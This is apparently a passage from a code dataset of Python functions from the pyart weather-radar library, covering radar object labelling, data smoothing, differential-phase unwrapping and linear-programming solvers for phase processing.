        indices = np.where(labels[i2] == lab)
        new_lab = np.unique(labels[i1][indices[0]])[0]
        labels[labels == lab] = new_lab
    labels = labels[0:i2]
    nobj = len(np.unique(labels)) - 1
    return (labels, nobj)"
ARM-DOE/pyart,_append_labels,"def _append_labels(labels, label_storage):
    """"""
    Appends consecutive sweeps of labels, creating a multi-sweep 2D array.
    Typically called iteratively.

    Parameters
    ----------
    labels : 2D array of ints
        Sweep containing object labels.
    label_storage : Empty list or 2D array of ints
        Array to append new sweep of labels to.

    Returns
    -------
    label_storage : 2D array of ints
        Updated array of object labels.

    """"""
    if len(label_storage) == 0:
        label_storage.append(labels)
        label_storage = np.array(label_storage[0])
    else:
        label_storage = np.append(label_storage, labels, axis=0)
    return label_storage"
ARM-DOE/pyart,_check_for_360,"def _check_for_360(az, delta):
    """"""
    Check if an array of azimuths indicates the sweep is a full 360 PPI.
    This should also spot RHIs (effectively, a narrow azimuth sector sweep).

    Parameters
    ----------
    az : array of int or float
        Azimuths in the sweep
    delta : int or float
        Size of allowable gap near PPI edges, in deg, to consider it full 360.

    Returns
    -------
    Flag : bool
        True - Sweep is a 360 PPI.

        False - Sweep is not a 360 PPI.

    """"""
    if np.abs(az[0] - az[-1]) < delta or np.abs(az[0] - az[-1]) > 360 - delta:
        if np.max(az) - np.min(az) > 360 - delta:
            if True not in (np.sin(np.deg2rad(az)) < np.sin(np.deg2rad(360 - delta))) or True not in (np.sin(np.deg2rad(az)) > np.sin(np.deg2rad(delta))):
                return False
            else:
                return True
        else:
            return False
    else:
        return False"
ARM-DOE/pyart,_check_sweeps,"def _check_sweeps(sweeps, radar):
    """"""
    Parse the sweeps keyword and convert it to a list of ints.
    The output will be iterated over.

    Parameters
    ----------
    sweeps : int or list of ints or None
        Sweep numbers to put into an iterable list. If None, all sweeps in the
        radar object will be examined.
    radar : pyart.core.Radar object
        Radar object to query.

    Returns
    -------
    sweeps : list of ints
        Sweep numbers as an iterable list.

    """"""
    if sweeps is None:
        sweeps = np.arange(len(radar.sweep_number['data']))
    elif hasattr(sweeps, '__len__'):
        sweeps = np.asarray(sweeps)
    else:
        sweeps = np.asarray([sweeps])
    return sweeps"
ARM-DOE/pyart,_check_threshold,"def _check_threshold(threshold):
    """"""
    Parse the threshold keyword and return the lower and upper boundaries for
    the object search.

    Parameters
    ----------
    threshold : int or float, or 2-element tuple of ints or floats
        Threshold values above (if single value) or between (if tuple)
        for objects to be identified.

    Returns
    -------
    tlo : int or float
        Lower bound for the threshold. Values below this will not be included
        in the hunt for objects.
    thi : int or float or None
        Upper bound for the threshold. Values above this will not be included
        in the hunt for objects. None means no upper bound.

    """"""
    if not hasattr(threshold, '__len__'):
        threshold = np.asarray([threshold])
    if len(threshold) == 2:
        tlo = threshold[0]
        thi = threshold[1]
    elif len(threshold) > 2 or np.ndim(threshold) > 1:
        raise IndexError('Fix threshold argument! Must be single scalar ' + 'or 2-element tuple')
    else:
        tlo = threshold[0]
        thi = None
    return (tlo, thi)"
ARM-DOE/pyart,_generate_dict,"def _generate_dict(label_storage):
    """"""
    Build the dictionary that includes all the object label information.
    If the entire Radar object was searched, the dictionary is ready to
    be added as a new field.

    Parameters
    ----------
    label_storage : 2D array of ints
        Object labels as a 2D array.

    Returns
    -------
    label_dict : dict
        Dictionary containing object labels and associated metadata.

    """"""
    label_dict = {}
    label_dict['data'] = label_storage
    label_dict['units'] = 'None'
    label_dict['long_name'] = 'Objects in Scan'
    label_dict['standard_name'] = 'objects_in_scan'
    label_dict['coordinates'] = 'elevation azimuth range'
    label_dict['valid_max'] = np.max(label_storage)
    label_dict['valid_min'] = 1
    return label_dict"
ARM-DOE/pyart,_get_data,"def _get_data(radar, iswp, field, tlo, thi, window, gatefilter=None):
    """"""
    Get data for a field from a given sweep in a Radar object.
    Data are smoothed if desired, then converted to binary 0s/1s based
    on whether valid values are present.

    Parameters
    ----------
    radar : pyart.core.Radar object
        Radar object to query.
    iswp : int
        Sweep number to query.
    field : str
        Name of field to investigate for speckles.
    tlo : int or float
        Lower bound for the threshold. Values below this will not be included
        in the hunt for objects.
    thi : int or float or None
        Upper bound for the threshold. Values above this will not be included
        in the hunt for objects. None means no upper bound.
    window : int or None
        Number of gates included in a smoothing box filter along a ray.
        If None, no smoothing is done.

    Other Parameters
    ----------------
    gatefilter : None or pyart.filters.GateFilter object, optional
        Py-ART GateFilter object to apply before labeling objects.
        If None, no filtering will be performed.

    Returns
    -------
    data : 2D array of ints
        Sweep as array of binary 0s/1s based on whether valid values exist.

    """"""
    data = radar.get_field(iswp, field, copy=True)
    if gatefilter is not None:
        (start, end) = radar.get_start_end(iswp)
        mask_filter = gatefilter.gate_excluded[start:end + 1]
        data = np.ma.masked_array(data, mask_filter)
    else:
        data = np.ma.masked_array(data)
    data = _smooth_data(data, window)
    data = data.filled(fill_value=BAD)
    if thi is None:
        cond = np.logical_or(data < tlo, data == BAD)
    else:
        cond = np.logical_or(data == BAD, np.logical_or(data < tlo, data > thi))
    data[cond] = 0
    data[~cond] = 1
    return data"
ARM-DOE/pyart,_get_labels,"def _get_labels(data):
    """"""
    Identify all the contiguous objects in a sweep. Contiguous means corners
    or sides of gates touch. Uses scipy.ndimage.label.

    Parameters
    ----------
    data : 2D array of ints
        Sweep that will be checked for objects. Sweep has already been
        converted to binary 0s/1s based on user-supplied thresholds.

    Returns
    -------
    labels : 2D array of ints
        Numeric object labels.
        Zero values mean no object at that location.
    nobj : int
        Number of distinct objects identified in sweep.

    """"""
    matrix = np.ones((3, 3), dtype='int16')
    (labels, nobj) = label(data, structure=matrix)
    return (labels, nobj)"
ARM-DOE/pyart,_smooth_data,"def _smooth_data(data, window):
    """"""
    Perform box filtering along each ray of a sweep, and return the
    smoothed field. Uses scipy.signal.convolve2d which provides excellent
    performance.

    Parameters
    ----------
    data : 2D array of ints or floats
        Sweep of data for a specific field. Will be masked.
    window : int or None
        Number of gates included in a smoothing box filter along a ray.
        If None, no smoothing is done.

    Returns
    -------
    data : 2D array of ints or floats
        Smoothed sweep of data.

    """"""
    if window is not None:
        return np.ma.masked_array(convolve2d(data, np.ones((1, window)) / np.float(window), mode='same', boundary='symm'))
    else:
        return data"
ARM-DOE/pyart,det_sys_phase,"def det_sys_phase(radar, ncp_lev=0.4, rhohv_lev=0.6, ncp_field=None, rhv_field=None, phidp_field=None):
    """"""
    Determine the system phase.

    Parameters
    ----------
    radar : Radar
        Radar object for which to determine the system phase.
    ncp_lev : float, optional
        Miminum normal coherent power level. Regions below this value will
        not be included in the phase calculation.
    rhohv_lev : float, optional
        Miminum copolar coefficient level. Regions below this value will not
        be included in the phase calculation.
    ncp_field, rhv_field, phidp_field : str, optional
        Field names within the radar object which represent the normal
        coherent power, the copolar coefficient, and the differential phase
        shift. A value of None for any of these parameters will use the
        default field name as defined in the Py-ART configuration file.

    Returns
    -------
    sys_phase : float or None
        Estimate of the system phase. None is not estimate can be made.

    """"""
    if ncp_field is None:
        ncp_field = get_field_name('normalized_coherent_power')
    if rhv_field is None:
        rhv_field = get_field_name('cross_correlation_ratio')
    if phidp_field is None:
        phidp_field = get_field_name('differential_phase')
    ncp = radar.fields[ncp_field]['data'][:, 30:]
    rhv = radar.fields[rhv_field]['data'][:, 30:]
    phidp = radar.fields[phidp_field]['data'][:, 30:]
    last_ray_idx = radar.sweep_end_ray_index['data'][0]
    return _det_sys_phase(ncp, rhv, phidp, last_ray_idx, ncp_lev, rhohv_lev)"
ARM-DOE/pyart,_det_sys_phase,"def _det_sys_phase(ncp, rhv, phidp, last_ray_idx, ncp_lev=0.4, rhv_lev=0.6):
    """"""Determine the system phase, see :py:func:`det_sys_phase`.""""""
    good = False
    phases = []
    for radial in range(last_ray_idx + 1):
        meteo = np.logical_and(ncp[radial, :] > ncp_lev, rhv[radial, :] > rhv_lev)
        mpts = np.where(meteo)
        if len(mpts[0]) > 25:
            good = True
            msmth_phidp = smooth_and_trim(phidp[radial, mpts[0]], 9)
            phases.append(msmth_phidp[0:25].min())
    if not good:
        return None
    return np.median(phases)"
ARM-DOE/pyart,fzl_index,"def fzl_index(fzl, ranges, elevation, radar_height):
    """"""
    Return the index of the last gate below a given altitude.

    Parameters
    ----------
    fzl : float
        Maximum altitude.
    ranges : array
        Range to measurement volume/gate in meters.
    elevation : float
        Elevation of antenna in degrees.
    radar_height :
        Altitude of radar in meters.

    Returns
    -------
    idx : int
        Index of last gate which has an altitude below `fzl`.

    Notes
    -----
    Standard atmosphere is assumed, R = 4 / 3 * Re

    """"""
    Re = 6371.0 * 1000.0
    p_r = 4.0 * Re / 3.0
    z = radar_height + (ranges ** 2 + p_r ** 2 + 2.0 * ranges * p_r * np.sin(elevation * np.pi / 180.0)) ** 0.5 - p_r
    if np.all(z > fzl):
        return 6
    else:
        return np.where(z < fzl)[0].max()"
ARM-DOE/pyart,det_process_range,"def det_process_range(radar, sweep, fzl, doc=10):
    """"""
    Determine the processing range for a given sweep.

    Queues the radar and returns the indices which can be used to slice
    the radar fields and select the desired sweep with gates which are
    below a given altitude.

    Parameters
    ----------
    radar : Radar
        Radar object from which ranges will be determined.
    sweep : int
        Sweep (0 indexed) for which to determine processing ranges.
    fzl : float
        Maximum altitude in meters. The determined range will not include
        gates which are above this limit.
    doc : int, optional
        Minimum number of gates which will be excluded from the determined
        range.

    Returns
    -------
    gate_end : int
        Index of last gate below `fzl` and satisfying the `doc` parameter.
    ray_start : int
        Ray index which defines the start of the region.
    ray_end : int
        Ray index which defined the end of the region.

    """"""
    ranges = radar.range['data']
    elevation = radar.fixed_angle['data'][sweep]
    radar_height = radar.altitude['data']
    gate_end = fzl_index(fzl, ranges, elevation, radar_height)
    if doc is not None:
        gate_end = min(gate_end, len(ranges) - doc)
    else:
        gate_end = min(gate_end, len(ranges))
    ray_start = radar.sweep_start_ray_index['data'][sweep]
    ray_end = radar.sweep_end_ray_index['data'][sweep] + 1
    return (gate_end, ray_start, ray_end)"
ARM-DOE/pyart,snr,"def snr(line, wl=11):
    """"""Return the signal to noise ratio after smoothing.""""""
    signal = smooth_and_trim(line, window_len=wl)
    _noise = smooth_and_trim(np.sqrt((line - signal) ** 2), window_len=wl)
    return abs(signal) / _noise"
ARM-DOE/pyart,smooth_masked,"def smooth_masked(raw_data, wind_len=11, min_valid=6, wind_type='median'):
    """"""
    Smoothes the data using a rolling window.
    data with less than n valid points is masked.

    Parameters
    ----------
    raw_data : float masked array
        The data to smooth.
    win_len : float
        Length of the moving window.
    min_valid : float
        Minimum number of valid points for the smoothing to be valid.
    wind_type : str
        Type of window. Can be median or mean.

    Returns
    -------
    data_smooth : float masked array
        Smoothed data.

    """"""
    valid_wind = ['median', 'mean']
    if wind_type not in valid_wind:
        raise ValueError('Window ' + wind_type + ' is none of ' + ' '.join(valid_wind))
    if wind_len % 2 == 0:
        wind_len += 1
    half_wind = int((wind_len - 1) / 2)
    (nrays, nbins) = np.shape(raw_data)
    data_smooth = np.ma.zeros((nrays, nbins))
    data_smooth[:] = np.ma.masked
    data_smooth.set_fill_value(get_fillvalue())
    mask = np.ma.getmaskarray(raw_data)
    valid = np.logical_not(mask)
    mask_wind = rolling_window(mask, wind_len)
    valid_wind = np.logical_not(mask_wind).astype(int)
    nvalid = np.sum(valid_wind, -1)
    data_wind = rolling_window(raw_data, wind_len)
    ind_valid = np.logical_and(nvalid >= min_valid, valid[:, half_wind:-half_wind]).nonzero()
    if data_wind is not None:
        data_smooth[ind_valid[0], ind_valid[1] + half_wind] = eval('np.ma.' + wind_type + '(data_wind, axis=-1)')[ind_valid]
    return data_smooth"
ARM-DOE/pyart,unwrap_masked,"def unwrap_masked(lon, centered=False, copy=True):
    """"""
    Unwrap a sequence of longitudes or headings in degrees.

    Parameters
    ----------
    lon : array
        Longtiudes or heading in degress. If masked output will also be
        masked.
    centered : bool, optional
        Center the unwrapping as close to zero as possible.
    copy : bool, optional.
        True to return a copy, False will avoid a copy when possible.

    Returns
    -------
    unwrap : array
        Array of unwrapped longtitudes or headings, in degrees.

    """"""
    masked_input = ma.isMaskedArray(lon)
    if masked_input:
        fill_value = lon.fill_value
    lon = np.ma.masked_invalid(lon).astype(float)
    if lon.ndim != 1:
        raise ValueError('Only 1-D sequences are supported')
    if lon.shape[0] < 2:
        return lon
    x = lon.compressed()
    if len(x) < 2:
        return lon
    w = np.zeros(x.shape[0] - 1, int)
    ld = np.diff(x)
    np.putmask(w, ld > 180, -1)
    np.putmask(w, ld < -180, 1)
    x[1:] += w.cumsum() * 360.0
    if centered:
        x -= 360 * np.round(x.mean() / 360.0)
    if lon.mask is ma.nomask:
        lon[:] = x
    else:
        lon[~lon.mask] = x
    if masked_input:
        lon.fill_value = fill_value
        return lon
    else:
        return lon.filled(np.nan)"
ARM-DOE/pyart,smooth_and_trim,"def smooth_and_trim(x, window_len=11, window='hanning'):
    """"""
    Smooth data using a window with requested size.

    This method is based on the convolution of a scaled window with the signal.
    The signal is prepared by introducing reflected copies of the signal
    (with the window size) in both ends so that transient parts are minimized
    in the begining and end part of the output signal.

    Parameters
    ----------
    x : array
        The input signal.
    window_len : int, optional
        The dimension of the smoothing window; should be an odd integer.
    window : str
        The type of window from 'flat', 'hanning', 'hamming', 'bartlett',
        'blackman' or 'sg_smooth'. A flat window will produce a moving
        average smoothing.

    Returns
    -------
    y : array
        The smoothed signal with length equal to the input signal.

    """"""
    if x.ndim != 1:
        raise ValueError('smooth only accepts 1 dimension arrays.')
    if x.size < window_len:
        raise ValueError('Input vector needs to be bigger than window size.')
    if window_len < 3:
        return x
    valid_windows = ['flat', 'hanning', 'hamming', 'bartlett', 'blackman', 'sg_smooth']
    if window not in valid_windows:
        raise ValueError('Window is on of ' + ' '.join(valid_windows))
    s = np.r_[x[window_len - 1:0:-1], x, x[-1:-window_len:-1]]
    if window == 'flat':
        w = np.ones(int(window_len), 'd')
    elif window == 'sg_smooth':
        w = np.array([0.1, 0.25, 0.3, 0.25, 0.1])
    else:
        w = eval('np.' + window + '(window_len)')
    y = np.convolve(w / w.sum(), s, mode='valid')
    return y[int(window_len / 2):len(x) + int(window_len / 2)]"
ARM-DOE/pyart,smooth_and_trim_scan,"def smooth_and_trim_scan(x, window_len=11, window='hanning'):
    """"""
    Smooth data using a window with requested size.

    This method is based on the convolution of a scaled window with the signal.
    The signal is prepared by introducing reflected copies of the signal
    (with the window size) in both ends so that transient parts are minimized
    in the begining and end part of the output signal.

    Parameters
    ----------
    x : ndarray
        The input signal.
    window_len : int, optional
        The dimension of the smoothing window; should be an odd integer.
    window : str, optional
        The type of window from 'flat', 'hanning', 'hamming', 'bartlett',
        'blackman' or 'sg_smooth'. A flat window will produce a moving
        average smoothing.

    Returns
    -------
    y : ndarray
        The smoothed signal with length equal to the input signal.

    """"""
    from scipy.ndimage import convolve1d
    if x.ndim != 2:
        raise ValueError('smooth only accepts 2 dimension arrays.')
    if x.shape[1] < window_len:
        mess = 'Input dimension 1 needs to be bigger than window size.'
        raise ValueError(mess)
    if window_len < 3:
        return x
    valid_windows = ['flat', 'hanning', 'hamming', 'bartlett', 'blackman', 'sg_smooth']
    if window not in valid_windows:
        raise ValueError('Window is on of ' + ' '.join(valid_windows))
    if window == 'flat':
        w = np.ones(int(window_len), 'd')
    elif window == 'sg_smooth':
        w = np.array([0.1, 0.25, 0.3, 0.25, 0.1])
    else:
        w = eval('np.' + window + '(window_len)')
    y = convolve1d(x, w / w.sum(), axis=1)
    return y"
ARM-DOE/pyart,noise,"def noise(line, wl=11):
    """"""Return the noise after smoothing.""""""
    signal = smooth_and_trim(line, window_len=wl)
    _noise = np.sqrt((line - signal) ** 2)
    return _noise"
ARM-DOE/pyart,get_phidp_unf,"def get_phidp_unf(radar, ncp_lev=0.4, rhohv_lev=0.6, debug=False, ncpts=20, doc=-10, overide_sys_phase=False, sys_phase=-135, nowrap=None, refl_field=None, ncp_field=None, rhv_field=None, phidp_field=None):
    """"""
    Get Unfolded Phi differential phase

    Parameters
    ----------
    radar : Radar
        The input radar.
    ncp_lev : float, optional
        Miminum normal coherent power level. Regions below this value will
        not be included in the calculation.
    rhohv_lev : float, optional
        Miminum copolar coefficient level. Regions below this value will not
        be included in the calculation.
    debug : bool, optional
        True to print debugging information, False to supress printing.
    ncpts : int, optional
        Minimum number of points in a ray. Regions within a ray smaller than
        this or beginning before this gate number are excluded from
        calculations.
    doc : int or None, optional
        Index of first gate not to include in field data, None include all.
    overide_sys_phase : bool, optional
        True to use `sys_phase` as the system phase. False will determine a
        value automatically.
    sys_phase : float, optional
        System phase, not used if overide_sys_phase is False.
    nowrap : int or None, optional
        Gate number where unwrapping should begin. `None` will unwrap all
        gates.
    refl_field ncp_field, rhv_field, phidp_field : str, optional
        Field names within the radar object which represent the horizonal
        reflectivity, normal coherent power, the copolar coefficient, and the
        differential phase shift. A value of None for any of these parameters
        will use the default field name as defined in the Py-ART
        configuration file.

    Returns
    -------
    cordata : array
        Unwrapped phi differential phase.

    """"""
    if refl_field is None:
        refl_field = get_field_name('reflectivity')
    if ncp_field is None:
        ncp_field = get_field_name('normalized_coherent_power')
    if rhv_field is None:
        rhv_field = get_field_name('cross_correlation_ratio')
    if phidp_field is None:
        phidp_field = get_field_name('differential_phase')
    if doc is not None:
        my_phidp = radar.fields[phidp_field]['data'][:, 0:doc]
        my_rhv = radar.fields[rhv_field]['data'][:, 0:doc]
        my_ncp = radar.fields[ncp_field]['data'][:, 0:doc]
        my_z = radar.fields[refl_field]['data'][:, 0:doc]
    else:
        my_phidp = radar.fields[phidp_field]['data']
        my_rhv = radar.fields[rhv_field]['data']
        my_ncp = radar.fields[ncp_field]['data']
        my_z = radar.fields[refl_field]['data']
    t = time()
    if overide_sys_phase:
        system_zero = sys_phase
    else:
        system_zero = det_sys_phase(radar, ncp_field=ncp_field, rhv_field=rhv_field, phidp_field=phidp_field)
        if system_zero is None:
            system_zero = sys_phase
    cordata = np.zeros(my_rhv.shape, dtype=float)
    for radial in range(my_rhv.shape[0]):
        my_snr = snr(my_z[radial, :])
        notmeteo = np.logical_or(np.logical_or(my_ncp[radial, :] < ncp_lev, my_rhv[radial, :] < rhohv_lev), my_snr < 10.0)
        x_ma = ma.masked_where(notmeteo, my_phidp[radial, :])
        try:
            ma.notmasked_contiguous(x_ma)
            for slc in ma.notmasked_contiguous(x_ma):
                if slc.stop - slc.start < ncpts or slc.start < ncpts:
                    x_ma.mask[slc.start - 1:slc.stop + 1] = True
            c = 0
        except TypeError:
            c = 1
            x_ma.mask = True
        except AttributeError:
            c = 1
            x_ma.mask = True
        if nowrap is not None:
            unwrapped = copy.deepcopy(x_ma)
            end_unwrap = unwrap_masked(x_ma[nowrap:], centered=False)
            unwrapped[nowrap:] = end_unwrap
        else:
            unwrapped = unwrap_masked(x_ma, centered=False)
        system_max = unwrapped[np.where(np.logical_not(notmeteo))][-10:-1].mean() - system_zero
        unwrapped_fixed = np.zeros(len(x_ma), dtype=float)
        based = unwrapped - system_zero
        based[0] = 0.0
        notmeteo[0] = False
        based[-1] = system_max
        notmeteo[-1] = False
        unwrapped_fixed[np.where(np.logical_not(based.mask))[0]] = based[np.where(np.logical_not(based.mask))[0]]
        if len(based[np.where(np.logical_not(based.mask))[0]]) > 11:
            unwrapped_fixed[np.where(based.mask)[0]] = np.interp(np.where(based.mask)[0], np.where(np.logical_not(based.mask))[0], smooth_and_trim(based[np.where(np.logical_not(based.mask))[0]]))
        else:
            unwrapped_fixed[np.where(based.mask)[0]] = np.interp(np.where(based.mask)[0], np.where(np.logical_not(based.mask))[0], based[np.where(np.logical_not(based.mask))[0]])
        if c != 1:
            cordata[radial, :] = unwrapped_fixed
        else:
            cordata[radial, :] = np.zeros(my_rhv.shape[1])
    if debug:
        print('Exec time: ', time() - t)
    return cordata"
ARM-DOE/pyart,construct_A_matrix,"def construct_A_matrix(n_gates, filt):
    """"""
    Construct a row-augmented A matrix. Equation 5 in Giangrande et al, 2012.

    A is a block matrix given by:

    .. math::

        \\bf{A} = \\begin{bmatrix} \\bf{I} & \\bf{-I} \\\\\\\\
                  \\bf{-I} & \\bf{I} \\\\\\\\ \\bf{Z}
                  & \\bf{M} \\end{bmatrix}

    where
        :math:`\\bf{I}` is the identity matrix
        :math:`\\bf{Z}` is a matrix of zeros
        :math:`\\bf{M}` contains our differential constraints.

    Each block is of shape n_gates by n_gates making
    shape(:math:`\\bf{A}`) = (3 * n, 2 * n).

    Note that :math:`\\bf{M}` contains some side padding to deal with edge
    issues.

    Parameters
    ----------
    n_gates : int
        Number of gates, determines size of identity matrix.
    filt : array
        Input filter.

    Returns
    -------
    a : matrix
        Row-augmented A matrix.

    """"""
    Identity = np.eye(n_gates)
    filter_length = len(filt)
    M_matrix_middle = np.diag(np.ones(n_gates - filter_length + 1), k=0) * 0.0
    posn = np.linspace(-1.0 * (filter_length - 1) / 2, (filter_length - 1) / 2, filter_length)
    for diag in range(filter_length):
        M_matrix_middle = M_matrix_middle + np.diag(np.ones(int(n_gates - filter_length + 1 - np.abs(posn[diag]))), k=int(posn[diag])) * filt[diag]
    side_pad = (filter_length - 1) // 2
    M_matrix = np.bmat([np.zeros([n_gates - filter_length + 1, side_pad], dtype=float), M_matrix_middle, np.zeros([n_gates - filter_length + 1, side_pad], dtype=float)])
    Z_matrix = np.zeros([n_gates - filter_length + 1, n_gates])
    return np.bmat([[Identity, -1.0 * Identity], [Identity, Identity], [Z_matrix, M_matrix]])"
ARM-DOE/pyart,construct_B_vectors,"def construct_B_vectors(phidp_mod, z_mod, filt, coef=0.914, dweight=60000.0):
    """"""
    Construct B vectors. See Giangrande et al, 2012.

    Parameters
    ----------
    phidp_mod : 2D array
        Phi differential phases.
    z_mod : 2D array.
       Reflectivity, modified as needed.
    filt : array
        Input filter.
    coef : float, optional.
        Cost coefficients.
    dweight : float, optional.
        Weights.

    Returns
    -------
    b : matrix
        Matrix containing B vectors.

    """"""
    n_gates = phidp_mod.shape[1]
    n_rays = phidp_mod.shape[0]
    filter_length = len(filt)
    side_pad = (filter_length - 1) // 2
    top_of_B_vectors = np.bmat([[-phidp_mod, phidp_mod]])
    data_edges = np.bmat([phidp_mod[:, 0:side_pad], np.zeros([n_rays, n_gates - filter_length + 1]), phidp_mod[:, -side_pad:]])
    ii = filter_length - 1
    jj = data_edges.shape[1] - 1
    list_corrl = np.zeros([n_rays, jj - ii + 1])
    for count in range(list_corrl.shape[1]):
        list_corrl[:, count] = -1.0 * (np.array(filt) * np.asarray(data_edges)[:, count:count + ii + 1]).sum(axis=1)
    sct = ((10.0 ** (0.1 * z_mod)) ** coef / dweight)[:, side_pad:-side_pad]
    sct[np.where(sct < 0.0)] = 0.0
    sct[:, 0:side_pad] = list_corrl[:, 0:side_pad]
    sct[:, -side_pad:] = list_corrl[:, -side_pad:]
    B_vectors = np.bmat([[top_of_B_vectors, sct]])
    return B_vectors"
ARM-DOE/pyart,LP_solver_cvxopt,"def LP_solver_cvxopt(A_Matrix, B_vectors, weights, solver='glpk'):
    """"""
    Solve the Linear Programming problem given in Giangrande et al, 2012 using
    the CVXOPT module.

    Parameters
    ----------
    A_Matrix : matrix
        Row augmented A matrix, see :py:func:`construct_A_matrix`
    B_vectors : matrix
        Matrix containing B vectors, see :py:func:`construct_B_vectors`
    weights : array
        Weights.
    solver : str or None
        LP solver backend to use, choices are 'glpk', 'mosek' or None to use
        the conelp function in CVXOPT.  'glpk' and 'mosek' are only available
        if they are installed and CVXOPT was build with the correct bindings.

    Returns
    -------
    soln : array
        Solution to LP problem.

    See Also
    --------
    LP_solver_pyglpk : Solve LP problem using the PyGLPK module.
    LP_solver_cylp : Solve LP problem using the cylp module.
    LP_solver_cylp_mp : Solve LP problem using the cylp module
                        using multi processes.

    """"""
    from cvxopt import matrix, solvers
    n_gates = weights.shape[1] // 2
    n_rays = B_vectors.shape[0]
    mysoln = np.zeros([n_rays, n_gates])
    G = matrix(np.bmat([[-A_Matrix], [-np.eye(2 * n_gates)]]))
    h_array = np.zeros(5 * n_gates - 4)
    for raynum in range(n_rays):
        c = matrix(weights[raynum]).T
        h_array[:3 * n_gates - 4] = -B_vectors[raynum]
        h = matrix(h_array)
        sol = solvers.lp(c, G, h, solver=solver)
        this_soln = np.zeros(n_gates)
        for i in range(n_gates):
            this_soln[i] = sol['x'][i + n_gates]
        mysoln[raynum, :] = smooth_and_trim(this_soln, window_len=5, window='sg_smooth')
    return mysoln"
ARM-DOE/pyart,LP_solver_pyglpk,"def LP_solver_pyglpk(A_Matrix, B_vectors, weights, it_lim=7000, presolve=True, really_verbose=False):
    """"""
    Solve the Linear Programming problem given in Giangrande et al, 2012 using
    the PyGLPK module.

    Parameters
    ----------
    A_Matrix : matrix
        Row augmented A matrix, see :py:func:`construct_A_matrix`
    B_vectors : matrix
        Matrix containing B vectors, see :py:func:`construct_B_vectors`
    weights : array
        Weights.
    it_lim : int, optional
        Simplex iteration limit.
    presolve : bool, optional
        True to use the LP presolver.
    really_verbose : bool, optional
        True to print LPX messaging. False to suppress.

    Returns
    -------
    soln : array
        Solution to LP problem.

    See Also
    --------
    LP_solver_cvxopt : Solve LP problem using the CVXOPT module.
    LP_solver_cylp : Solve LP problem using the cylp module.
    LP_solver_cylp_mp : Solve LP problem using the cylp module
                        using multi processes.

    """"""
    import glpk
    if really_verbose:
        message_state = glpk.LPX.MSG_ON
    else:
        message_state = glpk.LPX.MSG_OFF
    n_gates = weights.shape[1] // 2
    n_rays = B_vectors.shape[0]
    mysoln = np.zeros([n_rays, n_gates])
    lp = glpk.LPX()
    lp.name = 'LP_MIN'
    lp.obj.maximize = False
    lp.rows.add(2 * n_gates + n_gates - 4)
    lp.cols.add(2 * n_gates)
    glpk.env.term_on = True
    for cur_row in range(2 * n_gates + n_gates - 4):
        lp.rows[cur_row].matrix = list(np.squeeze(np.asarray(A_Matrix[cur_row, :])))
    for i in range(2 * n_gates):
        lp.cols[i].bounds = (0.0, None)
    for raynum in range(n_rays):
        this_soln = np.zeros(n_gates)
        for i in range(2 * n_gates + n_gates - 4):
            lp.rows[i].bounds = (B_vectors[raynum, i], None)
        for i in range(2 * n_gates):
            lp.obj[i] = weights[raynum, i]
        lp.simplex(msg_lev=message_state, meth=glpk.LPX.PRIMAL, it_lim=it_lim, presolve=presolve)
        for i in range(n_gates):
            this_soln[i] = lp.cols[i + n_gates].primal
        mysoln[raynum, :] = smooth_and_trim(this_soln, window_len=5, window='sg_smooth')
    return mysoln"
ARM-DOE/pyart,solve_cylp,"def solve_cylp(model, B_vectors, weights, ray, chunksize):
    """"""
    Worker process for LP_solver_cylp_mp.

    Parameters
    ----------
    model : CyClpModel
        Model of the LP Problem, see :py:func:`LP_solver_cylp_mp`
    B_vectors : matrix
        Matrix containing B vectors, see :py:func:`construct_B_vectors`
    weights : array
        Weights.
    ray : int
        Starting ray.
    chunksize : int
        Number of rays to process.

    Returns
    -------
    soln : array
        Solution to LP problem.

    See Also
    --------
    LP_solver_cylp_mp : Parent function.
    LP_solver_cylp : Single Process Solver.

    """"""
    from cylp.cy.CyClpSimplex import CyClpSimplex
    n_gates = weights.shape[1] // 2
    soln = np.zeros([chunksize, n_gates])
    s = CyClpSimplex(model)
    s.logLevel = 0
    i = 0
    for raynum in range(ray, ray + chunksize):
        s.setRowLowerArray(np.squeeze(np.asarray(B_vectors[raynum])))
        s.setObjectiveArray(np.squeeze(np.asarray(weights[raynum])))
        s.dual()
        soln[i, :] = s.primalVariableSolution['x'][n_gates:2 * n_gates]
        i = i + 1
    return soln"
ARM-DOE/pyart,LP_solver_cylp_mp,"def LP_solver_cylp_mp(A_Matrix, B_vectors, weights, really_verbose=False, proc=1):
    """"""
    Solve the Linear Programming problem given in Giangrande et al, 2012 using
    the CyLP module using multiple processes.

    Parameters
    ----------
    A_Matrix : matrix
        Row augmented A matrix, see :py:func:`construct_A_matrix`
    B_vectors : matrix
        Matrix containing B vectors, see :py:func:`construct_B_vectors`
    weights : array
        Weights.
    really_verbose : bool, optional
        True to print CLP messaging. False to suppress.
    proc : int, optional
        Number of worker processes.

    Returns
    -------
    soln : array
        Solution to LP problem.

    See Also
    --------
    LP_solver_cvxopt : Solve LP problem using the CVXOPT module.
    LP_solver_pyglpk : Solve LP problem using the PyGLPK module.
    LP_solver_cylp : Solve LP problem using the CyLP module using single
                     process.

    """"""
    import multiprocessing as mp
    from cylp.py.modeling.CyLPModel import CyLPArray, CyLPModel
    n_gates = weights.shape[1] // 2
    n_rays = B_vectors.shape[0]
    soln = np.zeros([n_rays, n_gates])
    model = CyLPModel()
    G = np.matrix(A_Matrix)
    h = CyLPArray(np.empty(B_vectors.shape[1]))
    x = model.addVariable('x', G.shape[1])
    model.addConstraint(G * x >= h)
    c = CyLPArray(np.empty(weights.shape[1]))
    model.objective = c * x
    chunksize = int(n_rays / proc)
    if n_rays % chunksize != 0:
        print('Problem of %d rays cannot be split to %d worker processes!\n\rFallback to 1 process!' % (n_rays, proc))
        chunksize = n_rays
        proc = 1
    print('Calculating with %d processes, %d rays per chunk' % (proc, chunksize))

    def worker(model, B_vectors, weights, ray, chunksize, out_q):
        """"""
        The worker function, invoked in a process.
        The results are placed in a dictionary that's pushed to a queue.
        """"""
        outdict = {}
        iray = int(ray / chunksize)
        outdict[iray] = solve_cylp(model, B_vectors, weights, ray, chunksize)
        out_q.put(outdict)
    out_q = mp.Queue()
    procs = []
    for raynum in range(0, n_rays, chunksize):
        p = mp.Process(target=worker, args=(model, B_vectors, weights, raynum, chunksize, out_q))
        procs.append(p)
        p.start()
    resultdict = {}
    for raynum in range(0, n_rays, chunksize):
        resultdict.update(out_q.get())
    for p in procs:
        p.join()
    for raynum in range(0, int(n_rays / chunksize)):
        soln[raynum * chunksize:raynum * chunksize + chunksize, :] = resultdict[raynum]
